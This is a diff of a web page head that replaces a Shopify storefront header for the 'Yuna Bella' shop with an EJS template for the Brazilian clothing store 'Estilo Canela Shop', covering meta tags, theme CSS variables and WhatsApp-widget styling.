@@ -1,400 +1,288 @@
-<!DOCTYPE html><html class="js" lang="pt-BR" style="--header-height: 152px;"><head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, height=device-height, minimum-scale=1.0, maximum-scale=5.0">
-    <meta name="theme-color" content="#000000"><link rel="preconnect" href="https://cdn.utmify.com.br">
-    <link rel="preconnect" href="https://connect.facebook.net">
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" xmlns:og="http://opengraphprotocol.org/schema/" lang="pt">
+    <head>
+        <link rel="preconnect" href="https://acdn-us.mitiendanube.com" />
+        <link rel="dns-prefetch" href="https://acdn-us.mitiendanube.com" />
+        <link rel="preconnect" href="https://fonts.googleapis.com" />
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <title><%= typeof ecTitle !== 'undefined' && ecTitle ? ecTitle : 'Estilo Canela Shop' %></title>
+        <meta name="description" content="A Estilo Canela nasceu para vestir mulheres que gostam de se destacar com pe&ccedil;as selecionadas que valorizam a silhueta e transmitem confian&ccedil;a." />
+        <link rel="preload" as="style" href="//fonts.googleapis.com/css?family=Roboto:400,700|Instrument+Sans:400,700&amp;display=swap" />
+        <link rel="preload" href="/assets/ec-theme.css" as="style" />
+        <link rel="preload" href="/assets/ec-colors.css" as="style" />
 
-    <script>window.pixelId = "6a596d1707e8a7852b2c4d94";</script>
-    
-    <title>Yuna Bella
-</title><link rel="canonical" href="https://yunabella.myshopify.com/"><meta property="og:type" content="website">
-  <meta property="og:title" content="Yuna Bella"><meta property="og:url" content="https://yunabella.myshopify.com/">
-<meta property="og:site_name" content="Yuna Bella"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="Yuna Bella">
-  <meta name="twitter:description" content="Yuna Bella">
-<link rel="preload" as="style" href="/assets/theme.css">
-    <link rel="preload" as="style" href="/assets/custom.css">
-    <link rel="preload" as="script" href="//yunabella.myshopify.com/cdn/shop/t/2/assets/theme.min.js?v=178620635019735494401787586402">
-    <link rel="preconnect" href="https://cdn.shopify.com">
-    <link rel="preconnect" href="https://fonts.shopifycdn.com">
-    <link rel="preload" href="//yunabella.myshopify.com/cdn/fonts/roboto/roboto_n4.2019d890f07b1852f56ce63ba45b2db45d852cba.woff2" as="font" type="font/woff2" crossorigin="">
-<link rel="preload" href="//yunabella.myshopify.com/cdn/fonts/maven_pro/mavenpro_n4.c68ed1d8b5c0af622b14d3bb80bf3ead8907ac11.woff2" as="font" type="font/woff2" crossorigin="">
+        <link rel="preconnect" href="https://img.youtube.com/" />
+        <% if (typeof ecVideoThumb !== 'undefined' && ecVideoThumb) { %><link rel="preload" fetchpriority="high" as="image" href="<%= ecVideoThumb %>">
+        <% } %>
+        <meta property="og:site_name" content="Estilo Canela Shop" />
 
-<style>
-  @font-face {
-  font-family: Roboto;
-  font-weight: 400;
-  font-style: normal;
-  font-display: swap;
-  src: url("//yunabella.myshopify.com/cdn/fonts/roboto/roboto_n4.2019d890f07b1852f56ce63ba45b2db45d852cba.woff2") format("woff2"),
-       url("//yunabella.myshopify.com/cdn/fonts/roboto/roboto_n4.238690e0007583582327135619c5f7971652fa9d.woff") format("woff");
+        <meta property="fb:app_id" content="379938028687793" />
+	<meta property="og:type" content="website" />
+	<meta property="og:title" content="<%= typeof ecTitle !== 'undefined' && ecTitle ? ecTitle : 'Estilo Canela Shop' %>" />
+	<meta property="og:description" content="<%= typeof ecOgDescription !== 'undefined' && ecOgDescription ? ecOgDescription : 'A Estilo Canela nasceu para vestir mulheres que gostam de se destacar com pe&ccedil;as selecionadas que valorizam a silhueta e transmitem confian&ccedil;a.' %>" />
+	<meta property="og:url" content="https://www.estilocanela.com.br" />
+
+            <meta property="og:image" content="https://acdn-us.mitiendanube.com/stores/007/592/235/themes/common/logo-1140566961563043034-1785175762-39e93b7b608b4b80493b221e9ae9e6bb1785175763.png" />
+    <meta property="og:image:secure_url" content="https://acdn-us.mitiendanube.com/stores/007/592/235/themes/common/logo-1140566961563043034-1785175762-39e93b7b608b4b80493b221e9ae9e6bb1785175763.png" />
+
+        <style>
+            @import url('//fonts.googleapis.com/css?family=Roboto:400,700|Instrument+Sans:400,700&display=swap');
+
+:root {
+  --main-foreground: #423e3e;
+  --main-background: #fbfaf6;
+
+  --accent-color: #484343;
+
+  --button-background: #c6a75e;
+  --button-foreground: #FFFFFF;
+
+  --label-background: #780302;
+  --label-foreground: #ffffff;
+
+  --adbar-background: #fbfaf6;
+  --adbar-foreground: #423e3e;
+
+  --header-background: #fbfaf6;
+  --header-foreground: #423e3e;
+  --header-transparent-foreground: ;
+
+  --newsletter-background: #FFFFFF;
+  --newsletter-foreground: #333333;
+
+  --footer-background: #fbfaf6;
+  --footer-foreground: #423e3e;
+
+  --main-foreground-opacity-05: #423e3e0D;
+  --main-foreground-opacity-08: #423e3e14;
+  --main-foreground-opacity-10: #423e3e1A;
+  --main-foreground-opacity-20: #423e3e33;
+  --main-foreground-opacity-30: #423e3e4D;
+  --main-foreground-opacity-40: #423e3e66;
+  --main-foreground-opacity-50: #423e3e80;
+  --main-foreground-opacity-60: #423e3e99;
+  --main-foreground-opacity-80: #423e3eCC;
+  --main-foreground-opacity-90: #423e3eE6;
+
+  --main-background-opacity-20: #fbfaf633;
+  --main-background-opacity-30: #fbfaf64D;
+  --main-background-opacity-50: #fbfaf680;
+  --main-background-opacity-60: #fbfaf699;
+  --main-background-opacity-80: #fbfaf6CC;
+  --main-background-opacity-90: #fbfaf6E6;
+
+  --accent-color-opacity-20: #48434333;
+
+  --header-foreground-opacity-20: #423e3e33;
+  --header-foreground-opacity-30: #423e3e4D;
+
+  --header-background-opacity-50: #fbfaf680;
+
+  --header-transparent-foreground-opacity-30: 4D;
+
+  --newsletter-foreground-opacity-80: #333333CC;
+
+  --footer-foreground-opacity-20: #423e3e33;
+  --footer-foreground-opacity-30: #423e3e4D;
+  --footer-foreground-opacity-50: #423e3e80;
+  --footer-foreground-opacity-60: #423e3e99;
+  --footer-foreground-opacity-80: #423e3eCC;
+
+  --success: #4bb98c;
+  --danger: #dd7774;
+  --warning: #dc8f38;
+
+  --heading-font: "Roboto", sans-serif;
+  --body-font: "Instrument Sans", sans-serif;
+
+  --h1: 32px;
+  --h2: 28px;
+  --h3: 24px;
+  --h4: 22px;
+  --h5: 20px;
+  --h6: 18px;
+
+  --font-large: 16px;
+  --font-big: 14px;
+  --font-base: 12px;
+  --font-medium: 11px;
+  --font-small: 10px;
+  --font-smallest: 8px;
+
+  --title-font-weight: 700;
+
 }
+        </style>
 
-  @font-face {
-  font-family: "Maven Pro";
-  font-weight: 400;
-  font-style: normal;
-  font-display: swap;
-  src: url("//yunabella.myshopify.com/cdn/fonts/maven_pro/mavenpro_n4.c68ed1d8b5c0af622b14d3bb80bf3ead8907ac11.woff2") format("woff2"),
-       url("//yunabella.myshopify.com/cdn/fonts/maven_pro/mavenpro_n4.522bf9c765ae9601c2a4846d60057ced1efdcde2.woff") format("woff");
-}
+        <link rel="stylesheet" type="text/css" href="/assets/ec-theme.css" media="all" />
 
-@font-face {
-  font-family: "Maven Pro";
-  font-weight: 600;
-  font-style: normal;
-  font-display: swap;
-  src: url("//yunabella.myshopify.com/cdn/fonts/maven_pro/mavenpro_n6.05e6df69bb75d015ee18df5f5798f1259a61f1c5.woff2") format("woff2"),
-       url("//yunabella.myshopify.com/cdn/fonts/maven_pro/mavenpro_n6.2a247e47cebb2168b097c70ce14ff7d72107293f.woff") format("woff");
-}
+        <link rel="stylesheet" type="text/css" href="/assets/ec-colors.css" media="all" />
 
-@font-face {
-  font-family: Roboto;
-  font-weight: 400;
-  font-style: italic;
-  font-display: swap;
-  src: url("//yunabella.myshopify.com/cdn/fonts/roboto/roboto_i4.57ce898ccda22ee84f49e6b57ae302250655e2d4.woff2") format("woff2"),
-       url("//yunabella.myshopify.com/cdn/fonts/roboto/roboto_i4.b21f3bd061cbcb83b824ae8c7671a82587b264bf.woff") format("woff");
-}
+        <link rel="stylesheet" href="/assets/ec-async.css" media="print" onload="this.media='all'">
 
+        <style>
+            a[href*="/sale"]{color:#780302!important;font-weight:600}.section-single-product{max-width:1240px!important;margin:0 auto!important;padding-left:30px!important;padding-right:30px!important}.section-single-product>.col-12.col-md-8{flex:0 0 63%!important;max-width:63%!important}.section-single-product>.col{flex:0 0 37%!important;max-width:37%!important;padding-left:28px!important}.section-single-product .col-2.d-none.d-md-block{flex:0 0 90px!important;max-width:90px!important}.product-image-container{max-width:calc(100% - 90px)!important}.page-header.pt-4{padding-top:12px!important}.breadcrumbs{margin-bottom:8px!important}@media(max-width:767px){.section-single-product{max-width:100%!important;padding-left:0!important;padding-right:0!important}.section-single-product>.col-12.col-md-8,.section-single-product>.col{flex:0 0 100%!important;max-width:100%!important;padding-left:15px!important;padding-right:15px!important}.product-image-container{max-width:100%!important}}.section-informative-banners{margin-top:0!important;padding-top:20px!important;padding-bottom:20px!important}.section-informative-banners .container,.section-informative-banners .row{margin-top:0!important;margin-bottom:0!important;padding-top:0!important;padding-bottom:0!important}.section-slider-home,.section-slider-home *{margin-bottom:0!important;padding-bottom:0!important}.section-video-home,.js-section-video{margin-top:0!important;padding-top:0!important;margin-bottom:0!important;padding-bottom:0!important}.section-informative-banners .service-item svg,.section-informative-banners .service-item img{width:50px!important;height:50px!important}.section-informative-banners h3,.section-informative-banners .h4{font-size:18px!important}.section-informative-banners .service-item,.section-informative-banners .service-item p,.section-informative-banners .service-item span{font-size:15px!important}.js-product-slide{padding-left:10px!important;padding-right:10px!important;box-sizing:border-box!important}.js-product-description,.js-view-more{display:none!important}.item-product{padding-left:8px!important;padding-right:8px!important;box-sizing:border-box!important}.js-products-home-grid{padding-left:20px!important;padding-right:5px!important;box-sizing:border-box!important}.js-product-table{padding-left:15px!important}.js-swiper-new-prev{left:25px!important}.section-featured-home{margin-bottom:10px!important;padding-bottom:0!important}.js-products-new-container{margin-bottom:0!important;padding-bottom:0!important}.js-products-home-grid{margin-bottom:0!important}.row{margin-bottom:0!important}@media(min-width:1024px){.nav-list-link[href*="/rastrear/"]{display:none!important}}
+        </style>
 
-  @font-face {
-  font-family: "Maven Pro";
-  font-weight: 700;
-  font-style: normal;
-  font-display: swap;
-  src: url("//yunabella.myshopify.com/cdn/fonts/maven_pro/mavenpro_n7.1cf8ef6e1971df8c9c821bcb73da0b10e0c49a8b.woff2") format("woff2"),
-       url("//yunabella.myshopify.com/cdn/fonts/maven_pro/mavenpro_n7.1ecc5b9854a5f30ff1b42559ffcca41d24759633.woff") format("woff");
-}
+    <link href="https://acdn-us.mitiendanube.com/stores/007/592/235/themes/common/logo-1555392577983506153-1776715025-48850a004c5558cabc92ae6efd70c4ce1776715025.ico" class="js-favicon" rel="icon" type="image/x-icon" />
+    <link href="https://acdn-us.mitiendanube.com/stores/007/592/235/themes/common/logo-1555392577983506153-1776715025-48850a004c5558cabc92ae6efd70c4ce1776715025.ico" class="js-favicon" rel="shortcut icon" type="image/x-icon" />
+<link rel="canonical" href="https://www.estilocanela.com.br/" />
 
-  
-  
+        <style>
+    .ec-wa {
+        --ec-wa-botao: #25D366;
+        --ec-wa-fundo: #fbfaf6;
+        --ec-wa-hover: #f1f1ec;
+        --ec-wa-texto: #423e3e;
+        --ec-wa-apoio: #484343;
+        --ec-wa-borda: #f1f1ec;
+        position: fixed;
+        right: 16px;
+        bottom: 16px;
+        z-index: 900;
+        display: flex;
+        flex-direction: column;
+        align-items: flex-end;
+        gap: 12px;
+    }
 
-  :root {
-    --default-text-font-size : 15px;
-    --base-text-font-size    : 15px;
-    --heading-font-family    : Roboto, sans-serif;
-    --heading-font-weight    : 400;
-    --heading-font-style     : normal;
-    --text-font-family       : "Maven Pro", sans-serif;
-    --text-font-weight       : 400;
-    --text-font-style        : normal;
-    --text-font-bolder-weight: 600;
-    --text-link-decoration   : underline;
+    .ec-wa__painel {
+        width: 280px;
+        max-width: calc(100vw - 32px);
+        background: var(--ec-wa-fundo);
+        border: 1px solid var(--ec-wa-borda);
+        border-radius: 4px;
+        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.12);
+        overflow: hidden;
+        display: none;
+    }
 
-    --text-color               : #000000;
-    --cormenu                  : #000000;
-    --fundomenu                : #ffffff;
-    --extra               	   : #000000;
-    --lancamento               : #202020;
-    --descontopix              : #4bbca3;
-    --botaowhatsapp            : #767676;
-    --background-timerbox      : #2e2d2d;
-    --background-timerbox2     : #2e2d2d;
-    --default_kit_color        : #00B27A;
-    --badge_discount_background: #000000;
-    --badge_discount_color     : #ffffff;
-    --more_payments_color      : #00ae12;
-    --badge_economy_background : #212121;
-    --economy_color            : #FFFFFF;
-    --economy_value_color      : #fedc37;
-    --countdown_background     : #383838;
-    --countdown_timer_color    : #fff;
-    --countdown_desc_color     : #fff;
-    --special_offer_background : #383838;
-    --special_offer_color      : #fff;
-    --special_offer_star_color : #00ae12;
-    --parcelamento             : #101010;
-    --lancamentotexto          : #ffffff;
-    --faixa          		   : false;
-    --porcento          	   : #000000;
-    --line1          	       : #c40bd1;
-    --line2          	       : #a221ab;
-    --line3          	       : #c83bd2;
-    --line4          	       : #993b9f;
-    --line5          	       : #c40bd1;
-    --textstrong          	       : #000000;
-    --text-color-rgb           : 0, 0, 0;
-    --heading-color            : #000000;
-    --border-color             : #f7f7f7;
-    --border-color-rgb         : 247, 247, 247;
-    --form-border-color        : #eaeaea;
-    --accent-color             : #202020;
-    --accent-color-rgb         : 32, 32, 32;
-    --link-color               : #000000;
-    --link-color-hover         : #000000;
-    --background               : #f9f9f9;
-    --secondary-background     : #ffffff;
-    --secondary-background-rgb : 255, 255, 255;
-    --accent-background        : rgba(32, 32, 32, 0.08);
+    .ec-wa__painel[data-aberto="true"] {
+        display: block;
+    }
 
-    --input-background: #ffffff;
+    .ec-wa__intro {
+        padding: 18px 20px 14px;
+        border-bottom: 1px solid var(--ec-wa-borda);
+    }
 
-    --error-color       : #ff8181;
-    --error-background  : rgba(255, 129, 129, 0.07);
-    --success-color     : #00b27a;
-    --success-background: rgba(0, 178, 122, 0.11);
+    .ec-wa__titulo {
+        margin: 0 0 6px;
+        font-size: 15px;
+        font-weight: 700;
+        color: var(--ec-wa-texto);
+        line-height: 1.3;
+    }
 
-    --primary-button-background      : #000000;
-    --primary-button-background-rgb  : 0, 0, 0;
-    --primary-button-text-color      : #ffffff;
-    --secondary-button-background    : #000000;
-    --secondary-button-background-rgb: 0, 0, 0;
-    --secondary-button-text-color    : #ffffff;
+    .ec-wa__descricao {
+        margin: 0;
+        font-size: 13px;
+        color: var(--ec-wa-apoio);
+        line-height: 1.5;
+    }
 
-    --header-background      : #ffffff;
-    --borda-menu             : ;
-    --header-text-color      : #434343;
-    --header-light-text-color: #434343;
-    --header-border-color    : rgba(67, 67, 67, 0.3);
-    --header-accent-color    : #000000;
-    --header_icon_search_color: #434343;
-    --header_icons_color      : #434343;
-    --header_search_background: #ffffff;
+    .ec-wa__opcao {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        padding: 14px 20px;
+        border-bottom: 1px solid var(--ec-wa-borda);
+        text-decoration: none;
+        color: var(--ec-wa-texto);
+        transition: background-color 0.15s ease;
+    }
 
-    --footer-background-color:    #ffffff;
-    --footer-heading-text-color:  #000000;
-    --footer-body-text-color:     #000000;
-    --footer-accent-color:        #000000;
-    --footer-accent-color-rgb:    0, 0, 0;
-    --footer-border:              none;
-    
-    --flickity-arrow-color: #c4c4c4;--product-on-sale-accent           : #202020;
-    --product-on-sale-accent-rgb       : 32, 32, 32;
-    --product-on-sale-color            : #ffffff;
-    --product-in-stock-color           : #3b3b3b;
-    --product-low-stock-color          : #0d0d0d;
-    --product-sold-out-color           : #8a9297;
-    --product-custom-label-1-background: #3b3b3b;
-    --product-custom-label-1-color     : #ffffff;
-    --product-custom-label-2-background: #3b3b3b;
-    --product-custom-label-2-color     : #ffffff;
-    --product-review-star-color        : #000000;
+    .ec-wa__opcao:last-child {
+        border-bottom: none;
+    }
 
-    --mobile-container-gutter : 20px;
-    --desktop-container-gutter: 40px;
+    .ec-wa__opcao:hover,
+    .ec-wa__opcao:focus-visible {
+        background-color: var(--ec-wa-hover);
+        text-decoration: none;
+        color: var(--ec-wa-texto);
+    }
 
-    --tesmony-logo: //yunabella.myshopify.com/cdn/shop/t/2/assets/Logo%20RD%20tesmoney_399x104.png?v=66607190280083436451787586402;
+    .ec-wa__icone-opcao {
+        flex: 0 0 auto;
+        width: 22px;
+        height: 22px;
+        fill: var(--ec-wa-apoio);
+    }
 
-    --popup_button_color              : #000000;
+    .ec-wa__nome {
+        display: block;
+        font-size: 14px;
+        font-weight: 600;
+        line-height: 1.3;
+    }
 
-    --colorp-progress                 : #fafafa;
-    --colors-progress                 : #ff6606;
-    --alt-progress                    : 9px;
-    --font-progress                   : 13px;
-    --margin-prog-s                   : 30px;
-    --margin-prog-i                   : 20px;
-  }
-</style>
+    .ec-wa__funcao {
+        display: block;
+        font-size: 12px;
+        color: var(--ec-wa-apoio);
+        line-height: 1.4;
+        margin-top: 2px;
+    }
 
-<script>
-  // IE11 does not have support for CSS variables, so we have to polyfill them
-  if (!(((window || {}).CSS || {}).supports && window.CSS.supports('(--a: 0)'))) {
-    const script = document.createElement('script');
-    script.type = 'text/javascript';
-    script.src = 'https://cdn.jsdelivr.net/npm/css-vars-ponyfill@2';
-    script.onload = function() {
-      cssVars({});
-    };
+    .ec-wa__botao {
+        width: 56px;
+        height: 56px;
+        padding: 0;
+        border: none;
+        border-radius: 50%;
+        background-color: var(--ec-wa-botao);
+        box-shadow: 0 4px 16px rgba(0, 0, 0, 0.18);
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        transition: transform 0.15s ease;
+    }
 
-    document.getElementsByTagName('head')[0].appendChild(script);
-  }
-</script>
+    .ec-wa__botao:hover {
+        transform: scale(1.05);
+    }
 
-    <script>window.performance && window.performance.mark && window.performance.mark('shopify.content_for_header.start');</script><meta id="shopify-digital-wallet" name="shopify-digital-wallet" content="/75996987590/digital_wallets/dialog">
-<meta id="in-context-paypal-metadata" data-shop-id="75996987590" data-venmo-supported="false" data-environment="production" data-locale="pt_BR" data-paypal-v4="true" data-currency="BRL">
-<script async="async" src="/checkouts/internal/preloads.js?locale=pt-BR"></script>
-<script id="shopify-features" type="application/json">{"accessToken":"","betas":["rich-media-storefront-analytics"],"domain":"yunabella.myshopify.com","predictiveSearch":true,"shopId":75996987590,"locale":"pt-br"}</script>
-<script>var Shopify = Shopify || {};
-Shopify.shop = "kmtt0y-jm.myshopify.com";
-Shopify.locale = "pt-BR";
-Shopify.currency = {"active":"BRL","rate":"1.0"};
-Shopify.country = "BR";
-Shopify.theme = {"name":"Yuna Bella","id":153890160838,"schema_name":"Evolution Enterprise","schema_version":"7.0","theme_store_id":null,"role":"main"};
-Shopify.theme.handle = "null";
-Shopify.theme.style = {"id":null,"handle":null};
-Shopify.cdnHost = "yunabella.myshopify.com/cdn";
-Shopify.routes = Shopify.routes || {};
-Shopify.routes.root = "/";
-Shopify.shopJsCdnBaseUrl = "https://cdn.shopify.com/shopifycloud/shop-js";
-Shopify.SignInWithShop = Shopify.SignInWithShop || {};
-Shopify.SignInWithShop.User = Shopify.SignInWithShop.User || {};
-Shopify.SignInWithShop.User.recognized = false;</script>
-<script type="module">!function(o){(o.Shopify=o.Shopify||{}).modules=!0}(window);</script>
-<script>!function(o){function n(){var o=[];function n(){o.push(Array.prototype.slice.apply(arguments))}return n.q=o,n}var t=o.Shopify=o.Shopify||{};t.loadFeatures=n(),t.autoloadFeatures=n()}(window);</script>
-<script>
-  window.Shopify = window.Shopify || {};
-  window.Shopify.SignInWithShop = window.Shopify.SignInWithShop || {};
-  window.Shopify.SignInWithShop.assetMetrics = { sampleRate: 0.25 };
-  window.Shopify.SignInWithShop.eligible = true;
-</script>
-<script id="shop-js-analytics" type="application/json">{"pageType":"index"}</script>
-<script>
-  window.Shopify = window.Shopify || {};
-  if (!window.Shopify.featureAssets) window.Shopify.featureAssets = {};
-  window.Shopify.featureAssets['shop-js'] = {"shop-toast-manager":["modules/v2/loader.shop-toast-manager.pt-BR.esm.js"],"listener":["modules/v2/loader.listener.pt-BR.esm.js"],"shop-button":["modules/v2/loader.shop-button.pt-BR.esm.js"],"init-shop-user-recognition":["modules/v2/loader.init-shop-user-recognition.pt-BR.esm.js"],"shop-cash-offers":["modules/v2/loader.shop-cash-offers.pt-BR.esm.js"],"init-shop-email-lookup-coordinator":["modules/v2/loader.init-shop-email-lookup-coordinator.pt-BR.esm.js"],"checkout-modal":["modules/v2/loader.checkout-modal.pt-BR.esm.js"],"avatar":["modules/v2/loader.avatar.pt-BR.esm.js"],"init-fed-cm":["modules/v2/loader.init-fed-cm.pt-BR.esm.js"],"init-windoid":["modules/v2/loader.init-windoid.pt-BR.esm.js"],"init-shop-for-new-customer-accounts":["modules/v2/loader.init-shop-for-new-customer-accounts.pt-BR.esm.js"],"init-shop-cart-sync":["modules/v2/loader.init-shop-cart-sync.pt-BR.esm.js"],"init-customer-accounts-sign-up":["modules/v2/loader.init-customer-accounts-sign-up.pt-BR.esm.js"],"init-customer-accounts":["modules/v2/loader.init-customer-accounts.pt-BR.esm.js"],"shop-login":["modules/v2/loader.shop-login.pt-BR.esm.js"],"shop-login-button":["modules/v2/loader.shop-login-button.pt-BR.esm.js"],"shop-user-recognition":["modules/v2/loader.shop-user-recognition.pt-BR.esm.js"],"pay-button":["modules/v2/loader.pay-button.pt-BR.esm.js"],"shop-follow-button":["modules/v2/loader.shop-follow-button.pt-BR.esm.js"],"shop-cart-sync":["modules/v2/loader.shop-cart-sync.pt-BR.esm.js"],"lead-capture":["modules/v2/loader.lead-capture.pt-BR.esm.js"],"payment-terms":["modules/v2/loader.payment-terms.pt-BR.esm.js"]};
-</script>
-<script id="__st">var __st={"a":75996987590,"offset":-10800,"reqid":"6f9eeb55-6e2c-4ff0-8e40-1784c2848083-1787669148","pageurl":"yunabella.myshopify.com\/","u":"4e824a5a1eea","p":"home"};</script>
-<script>window.ShopifyPaypalV4VisibilityTracking = true;</script>
-<script id="captcha-bootstrap">!function(){'use strict';const t='contact',e='account',n='new_comment',o=[[t,t],['blogs',n],['comments',n],[t,'customer']],c=[[e,'customer_login'],[e,'guest_login'],[e,'recover_customer_password'],[e,'create_customer']],r=t=>t.map((([t,e])=>`form[action*='/${t}']:not([data-nocaptcha='true']) input[name='form_type'][value='${e}']`)).join(','),a=t=>()=>t?[...document.querySelectorAll(t)].map((t=>t.form)):[];function s(){const t=[...o],e=r(t);return a(e)}const i='password',u='form_key',d=['recaptcha-v3-token','g-recaptcha-response','h-captcha-response',i],f=()=>{try{return window.sessionStorage}catch{return}},m='__shopify_v',_=t=>t.elements[u];function p(t,e,n=!1){try{const o=window.sessionStorage,c=JSON.parse(o.getItem(e)),{data:r}=function(t){const{data:e,action:n}=t;return t[m]||n?{data:e,action:n}:{data:t,action:n}}(c);for(const[e,n]of Object.entries(r))t.elements[e]&&(t.elements[e].value=n);n&&o.removeItem(e)}catch(o){console.error('form repopulation failed',{error:o})}}const l='form_type',E='cptcha';function T(t){t.dataset[E]=!0}const w=window,h=w.document,L='Shopify',v='ce_forms',y='captcha';let A=!1;((t,e)=>{const n=(g='f06e6c50-85a8-45c8-87d0-21a2b65856fe',I='https://cdn.shopify.com/shopifycloud/storefront-forms-hcaptcha/ce_storefront_forms_captcha_hcaptcha.v1.5.3.iife.js',D={infoText:'Protegido por hCaptcha',privacyText:'Privacidade',termsText:'Termos'},(t,e,n)=>{const o=w[L][v],c=o.bindForm;if(c)return c(t,g,e,D).then(n);var r;o.q.push([[t,g,e,D],n]),r=I,A||(h.body.append(Object.assign(h.createElement('script'),{id:'captcha-provider',async:!0,src:r})),A=!0)});var g,I,D;w[L]=w[L]||{},w[L][v]=w[L][v]||{},w[L][v].q=[],w[L][y]=w[L][y]||{},w[L][y].protect=function(t,e){n(t,void 0,e),T(t)},Object.freeze(w[L][y]),function(t,e,n,w,h,L){const[v,y,A,g]=function(t,e,n){const i=e?o:[],u=t?c:[],d=[...i,...u],f=r(d),m=r(i),_=r(d.filter((([t,e])=>n.includes(e))));return[a(f),a(m),a(_),s()]}(w,h,L),I=t=>{const e=t.target;return e instanceof HTMLFormElement?e:e&&e.form},D=t=>v().includes(t);t.addEventListener('submit',(t=>{const e=I(t);if(!e)return;const n=D(e)&&!e.dataset.hcaptchaBound&&!e.dataset.recaptchaBound,o=_(e),c=g().includes(e)&&(!o||!o.value);(n||c)&&t.preventDefault(),c&&!n&&(function(t){try{if(!f())return;!function(t){const e=f();if(!e)return;const n=_(t);if(!n)return;const o=n.value;o&&e.removeItem(o)}(t);const e=Array.from(Array(32),(()=>Math.random().toString(36)[2])).join('');!function(t,e){_(t)||t.append(Object.assign(document.createElement('input'),{type:'hidden',name:u})),t.elements[u].value=e}(t,e),function(t,e){const n=f();if(!n)return;const o=[...t.querySelectorAll(`input[type='${i}']`)].map((({name:t})=>t)),c=[...d,...o],r={};for(const[a,s]of new FormData(t).entries())c.includes(a)||(r[a]=s);n.setItem(e,JSON.stringify({[m]:1,action:t.action,data:r}))}(t,e)}catch(e){console.error('failed to persist form',e)}}(e),e.submit())}));const S=(t,e)=>{t&&!t.dataset[E]&&(n(t,e.some((e=>e===t))),T(t))};for(const o of['focusin','change'])t.addEventListener(o,(t=>{const e=I(t);D(e)&&S(e,y())}));const B=e.get('form_key'),M=e.get(l),P=B&&M;t.addEventListener('DOMContentLoaded',(()=>{const t=y();if(P)for(const e of t)e.elements[l].value===M&&p(e,B);[...new Set([...A(),...v().filter((t=>'true'===t.dataset.shopifyCaptcha))])].forEach((e=>S(e,t)))}))}(h,new URLSearchParams(w.location.search),n,t,e,['guest_login'])})(!0,!0)}();</script>
-<script integrity="sha256-JjoPp5ZfB1sSAs5SQaol1x1GgvveM+BgmRzyDexInEQ=" data-source-attribution="shopify.loadfeatures" defer="defer" src="/assets/load_feature-1bd60354.js" crossorigin="anonymous"></script>
-<script>(function () {var userAgent = navigator.userAgent;var platform = navigator.platform;var maxTouchPoints = navigator.maxTouchPoints || 0;var isIOS = /iPad|iPhone|iPod/.test(platform) || (platform === 'MacIntel' && maxTouchPoints > 1);var isMacSafari = platform.indexOf('Mac') === 0 && /Safari/.test(userAgent) && !/Chrome|Chromium|CriOS|FxiOS|Edg|OPR|Android/.test(userAgent);var isAppleSafari = isIOS || isMacSafari;if (isAppleSafari) {fetch('/sf_private_access_tokens' + location.search).catch(function () {});}function browserMajorVersion(pattern) {var match = userAgent.match(pattern);return match ? parseInt(match[1], 10) : null;}function shouldLoadAutosizesPolyfill() {if (!window.PerformanceObserver?.supportedEntryTypes?.includes('paint')) {return false;}var chromeVersion = browserMajorVersion(/Chrome\/(\d+)/);if (chromeVersion !== null) {return chromeVersion < 126;}var firefoxVersion = browserMajorVersion(/Firefox\/(\d+)/);if (firefoxVersion !== null) {return firefoxVersion < 150;}var safariVersion = isAppleSafari ? browserMajorVersion(/Version\/(\d+).*Safari\//) : null;if (safariVersion !== null) {return safariVersion < 27;}return true;}if (shouldLoadAutosizesPolyfill()) {var autosizesScript = document.createElement('script');autosizesScript.async = true;autosizesScript.crossOrigin = 'anonymous';autosizesScript.src = "//yunabella.myshopify.com/cdn/shopifycloud/storefront/assets/storefront/autosizes-84416378.js";(document.head || document.documentElement).appendChild(autosizesScript);}window.ShopifyAnalytics = window.ShopifyAnalytics || {};window.ShopifyAnalytics.performance = window.ShopifyAnalytics.performance || {};(function () {var LONG_FRAME_THRESHOLD = 50;var longAnimationFrames = [];var activeRafId = null;function collectLongFrames() {var previousTime = null;function rafMonitor(now) {if (activeRafId === null) {return;}var delta = now - previousTime;if (delta > LONG_FRAME_THRESHOLD) {longAnimationFrames.push({startTime: previousTime,endTime: now,});}previousTime = now;activeRafId = requestAnimationFrame(rafMonitor);}previousTime = performance.now();activeRafId = requestAnimationFrame(rafMonitor);}if (!window.PerformanceObserver?.supportedEntryTypes?.includes('long-animation-frame')) {collectLongFrames();var timeoutId = setTimeout(function () {cancelAnimationFrame(activeRafId);}, 10000);window.ShopifyAnalytics.performance.getLongAnimationFrames = function (stopCollection) {if (stopCollection === undefined) {stopCollection = false;}if (stopCollection) {clearTimeout(timeoutId);cancelAnimationFrame(activeRafId);}return longAnimationFrames;};}})();})();</script><script id="shopify-origin-trials" async="async" integrity="sha256-mqQjA+yhr1DtPsW5MhDIq3zDu+LghfjNT49r/ttG3eY=" src="/assets/origin_trials-5059b83f.js" crossorigin="anonymous" onload="window.__shopifyOriginTrialsDone = true" onerror="window.__shopifyOriginTrialsDone = true"></script>
-<script>
-  window.Shopify = window.Shopify || {};
-  window.Shopify.MCP = window.Shopify.MCP || {};
-  window.Shopify.MCP.enabled = true;
-  window.Shopify.MCP.shop = "kmtt0y-jm.myshopify.com";
-  window.Shopify.MCP.mcpEndpoint = "https:\/\/yunabella.myshopify.com\/api\/mcp";
-  window.Shopify.MCP.tools = [{"name":"search_shop_policies_and_faqs","description":"Used to get facts about the stores policies, products, or services.\nSome examples of questions you can ask are:\n  - What is your return policy?\n  - What is your shipping policy?\n  - What is your phone number?\n  - What are your hours of operation?\"\n","inputSchema":{"$schema":"https:\/\/json-schema.org\/draft\/2020-12\/schema","type":"object","properties":{"query":{"type":"string","description":"A natural language query."},"context":{"type":"string","description":"Additional information about the request such as user demographics, mood, location, or other relevant details that could help in tailoring the response appropriately."}},"required":["query"]}}];
-</script>
